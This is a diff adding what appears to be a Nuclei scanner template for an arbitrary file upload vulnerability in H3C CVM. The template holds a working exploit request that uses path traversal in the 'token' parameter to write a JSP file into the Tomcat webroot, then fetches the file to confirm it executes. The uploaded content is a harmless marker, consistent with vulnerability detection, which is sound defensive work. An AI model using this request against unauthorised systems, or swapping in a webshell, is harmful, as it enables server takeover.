@@ -1,0 +1,47 @@
+id: h3c-cvm-file-upload
+
+info:
+  name: H3C CVM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    H3C CVM has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain a webshell, control server permissions, read sensitive information, etc.
+  tags: file-upload
+
+variables:
+  random_hex: "{{rand_base(6)}}"
+  random_hex_2: "{{rand_base(6)}}"
+  file_content: "<%out.print(\"{{random_hex}}\");%>"
+  file_name: "{{random_hex_2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{file_name}}.jsp&name=222"
+    headers:
+      Content-Range: "bytes 0-10/20"
+      Referer: "{{BaseURL}}/cas/login"
+    body: "{{file_content}}"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"success\\\":true"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/cas/js/lib/buttons/{{file_name}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{random_hex}}"
